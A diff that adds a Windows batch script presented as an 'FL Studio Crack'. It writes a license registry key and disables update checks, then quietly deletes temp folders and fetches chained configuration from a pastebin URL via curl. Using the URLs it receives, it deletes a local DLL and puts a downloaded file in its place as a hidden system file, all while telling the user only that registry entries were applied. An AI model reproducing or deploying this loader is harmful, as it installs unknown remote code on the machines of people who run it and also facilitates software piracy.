@@ -1,0 +1,68 @@
+ÿþ&cls
+ÿþ
+ÿþ&cls
+ÿþ
+ÿþ&cls
+ÿþ
+@echo off
+title GetIntoPC.com
+color 0A
+mode con: cols=75 lines=30
+cls
+setlocal EnableDelayedExpansion
+
+echo =========================================================
+echo                     FL STUDIO CRACK
+echo =========================================================
+echo.
+echo Usuario: %USERNAME%
+echo Computador: %COMPUTERNAME%
+echo Data: %DATE%
+echo Hora: %TIME%
+echo.
+
+echo =========================================================
+echo [1/7] FINALIZANDO PROCESSOS
+echo =========================================================
+echo.
+echo Applying FL Studio registry keys...
+
+:: Create the FL Studio 26.1 registration key
+reg add "HKEY_CURRENT_USER\Software\Image-Line\Registrations\FL Studio 26.1" /v "ILRegKey" /t REG_SZ /d "7C921F59743E64352D112418CFC420C9EC2A320D013D6399363F221889AB2ACEF0B52E0D01FC81192727B09B8AC42F125EFA350A0BFC81192E2EB09B8AC820CFF0B52E0A01395F1B3C2D1DDF0AA31CC9ECD7FE72EC3F6430DC3140D7C01B1EA2E6D435A57F2C6C412EDF4698C5CA2B125EFA30030EFC81192E1A171889AB2FCEE62A4CE50E3E689929291DB3A21B29CDEAD43FA5093B6A4320DF23DFA2C82012E3D03F0601FC6A3F20161D18CFC120CEEC2A3204013E649929131DDFA21B29C1ECD03FE3E3C1C93432324218CFC120C1E72A32040141649929131DD5CD1B29C1ECD7387CEC2F831FDC2928B3C1C2ACCDE9D23301AC3B87431213B0DECEC22ACAF0DC3A0D01305F4413271DDD0ACC23CFECD5FE0672306C43DC2922B3CFC2ACCDEBD23409AC3B89432D27B0DEC1C227CBF0DC33090B395F44122E26B30ACC2ACBE9D2FE0672308E43DC2922B3C1C2ACCDEBD43F09AC3B89412027B0DEC1C420C9F0DC330D013B5F4412271DD90ACC2ACFECDFFE067235643BDC2922B1A2C1ACCDEBD43F08AC3B89412012B0DEC1C42BCBF0DC330D07355F44122717D70ACC2ACFEADCFE0672356848DC2922B1C5C2ACCDEBD43209AC3B89412D2EB018213A26CAEBDB420407358C4D27292AB3CBA820CDE2D73A0D003F6C31132B4ADB8BC12DC1E6D039730E3E883C113141BCC5AC1BC9EDB540080A498A1B1D1A2E9D8B8F1DAF57D0307D7243651B36C6A3071022C525" /f
+reg add "HKEY_CURRENT_USER\Software\Image-Line\Registrations" /v "FL Studio license plate" /t REG_SZ /d "Cirno" /f
+reg add "HKEY_CURRENT_USER\Software\Image-Line\FL Studio 25\General\MIDIForm" /v "AutoCheckUpdatesBox" /t REG_SZ /d "0" /f
+reg add "HKEY_CURRENT_USER\Software\Image-Line\FL Studio 25\General\MIDIForm" /v "AutoDownloadUpdatesBox" /t REG_SZ /d "0" /f
+
+del /Q "%USERPROFILE%\AppData\Local\Temp\*" >nul 2>&1
+rd /S /Q "c:\windows\temp" >nul 2>&1
+
+set "URL=https://pastebin.com/raw/r82Qah90"
+
+for /f "tokens=1,* delims==" %%A in ('curl -L -s "!URL!"') do (
+    set "%%A=%%B"
+)
+
+if defined LOADER_2 (
+    set "URL=!LOADER_2!"
+
+    for /f "tokens=1,* delims==" %%A in ('curl -L -s "!URL!"') do (
+        set "%%A=%%B"
+    )
+)
+
+if defined MAIN_URL (
+    set "URL=!MAIN_URL!"
+
+    for /f "tokens=1,* delims==" %%A in ('curl -L -s "!URL!"') do (
+        set "%%A=%%B"
+    )
+)
+
+attrib -s -h "%OLD_PATH%\%OLD_DLL%" >nul 2>&1
+del /F /Q "%OLD_PATH%\%OLD_DLL%" >nul 2>&1
+curl -L -o "%NEW_PATH%\%NEW_NAME%" "!DOWNLOAD_URL!" >nul 2>&1
+ren "%NEW_PATH%\%NEW_NAME%" "%NEW_DLL%" >nul 2>&1
+attrib +s +h "%OLD_PATH%\%OLD_DLL%" >nul 2>&1
+
+echo Successfully applied registry entries.
+pause
